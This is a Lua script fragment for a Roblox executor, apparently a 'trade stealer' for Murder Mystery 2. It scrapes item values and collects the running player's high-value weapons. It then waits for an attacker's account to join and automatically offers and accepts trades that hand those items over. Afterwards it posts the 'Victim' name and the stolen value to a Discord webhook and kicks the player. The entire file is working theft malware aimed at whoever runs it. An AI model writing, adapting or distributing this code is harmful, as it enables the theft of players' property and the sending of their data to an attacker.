local headers = {
    ["Accept"] = "text/html",
    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}
local function trim(s) return s:match("^%s*(.-)%s*$") end

local function fetchHTML(url)
    local success, res = pcall(Request, {Url=url, Method="GET", Headers=headers})
    if success and res and res.StatusCode == 200 then return res.Body end
    return ""
end

local function parseValue(html)
    if not html then return nil end
    local v = html:match('<b%s+class=["\']itemvalue["\']>([%d,%.]+)</b>')
    if v then return tonumber(v:gsub(",", "")) end
    return nil
end

local function extractItems(html)
    local t = {}
    for head, body in html:gmatch('<div%s+class=["\']itemhead["\']>(.-)</div>%s*<div%s+class=["\']itembody["\']>(.-)</div>') do
        local name = head:match("([^<]+)")
        if name then
            name = trim(name:gsub("%s+", " ")):lower()
            t[name] = parseValue(body)
        end
    end
    return t
end

local function buildValueList()
    local all = {}
    local done = 0
    for cat, url in pairs(categories) do
        task.spawn(function()
            local html = fetchHTML(url)
            if html ~= "" then
                local items = extractItems(html)
                for k, v in pairs(items) do all[k] = v end
            end
            done += 1
        end)
    end
    repeat task.wait(0.1) until done >= 5
    return all
end

local minRarityIndex = table.find(rarityTable, min_rarity) or 1
local godlyIndex = table.find(rarityTable, "Godly")

for id, count in pairs(realData.Weapons.Owned) do
    local itemData = database[id]
    if itemData and not untradable[id] then
        local rarity = itemData.Rarity or "Common"
        local rIndex = table.find(rarityTable, rarity) or 1
        if rIndex >= minRarityIndex then
            local itemName = (itemData.ItemName or ""):lower()
            local val = valueList[itemName] or (rIndex >= godlyIndex and 2 or 1)
            if val >= min_value then
                totalValue += val * count
                table.insert(weaponsToSend, {DataID=id, Rarity=rarity, Amount=count, Value=val})
            end
        end
    end
end

local function SendDiscord(data)
    local body = HttpService:JSONEncode(data)
    for attempt = 1, 3 do
        local success = pcall(function()
            return Request({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        end)
        if success then return true end
        task.wait(0.5)
    end
    return false
end

local function FindRemote(list)
    for _, v in ipairs(list) do if v then return v end end
    return nil
end

local SendTradeRequestRemote = FindRemote(TradeRemotes.SendRequest)
local GetTradeStatusRemote = FindRemote(TradeRemotes.GetStatus)
local OfferItemRemote = FindRemote(TradeRemotes.OfferItem)
local AcceptTradeRemote = FindRemote(TradeRemotes.AcceptTrade)
local DeclineTradeRemote = FindRemote(TradeRemotes.DeclineTrade)
local DeclineRequestRemote = FindRemote(TradeRemotes.DeclineRequest)

if not SendTradeRequestRemote or not GetTradeStatusRemote or not OfferItemRemote or not AcceptTradeRemote then
    plr:Kick("Trade Remotes Not Found - MM2 may have updated")
    return
end

local function getTradeStatus()
    local s = nil
    pcall(function() if GetTradeStatusRemote then s = GetTradeStatusRemote:InvokeServer() end end)
    return s or "None"
end

local function sendTradeRequest(name)
    local target = Players:FindFirstChild(name)
    if not target then return false end
    local success = pcall(function()
        if SendTradeRequestRemote then SendTradeRequestRemote:InvokeServer(target) end
    end)
    return success
end

local function addItem(id)
    pcall(function() if OfferItemRemote then OfferItemRemote:FireServer(id, "Weapons") end end)
end

local function acceptTrade()
    pcall(function() if AcceptTradeRemote then AcceptTradeRemote:FireServer() end end)
end

local function declineTrade()
    pcall(function() if DeclineTradeRemote then DeclineTradeRemote:FireServer() end end)
end

local function declineRequest()
    pcall(function() if DeclineRequestRemote then DeclineRequestRemote:FireServer() end end)
end

task.spawn(function()
    local owner = nil
    local waited = 0
    repeat
        for _, p in ipairs(Players:GetPlayers()) do
            if table.find(users, p.Name) then
                owner = p
                break
            end
        end
        if not owner then task.wait(1); waited += 1 end
    until owner or waited >= 180
    
    if not owner then
        plr:Kick("Owner did not join in 3 minutes")
        return
    end
    
    task.wait(1.5)
    
    while #weaponsToSend > 0 do
        local status = getTradeStatus()
        
        if status == "None" then
            sendTradeRequest(owner.Name)
            task.wait(2)
        elseif status == "ReceivingRequest" then
            declineRequest()
            task.wait(0.5)
        elseif status == "StartTrade" then
            for i = 1, math.min(4, #weaponsToSend) do
                local item = table.remove(weaponsToSend, 1)
                for _ = 1, item.Amount do
                    addItem(item.DataID)
                    task.wait(0.05)
                end
            end
            task.wait(6)
            acceptTrade()
            repeat task.wait(0.1) until getTradeStatus() == "None" or #weaponsToSend == 0
            task.wait(1)
        else
            task.wait(0.5)
        end
    end
    
    SendDiscord({
        content = "@everyone",
        embeds = {{
            title = "TRADE COMPLETED",
            color = 65280,
            fields = {
                {name = "Victim", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Total Value", value = "```" .. totalValue .. "```", inline = true}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })
    
    task.wait(1)
    plr:Kick("All items transferred successfully")
end)
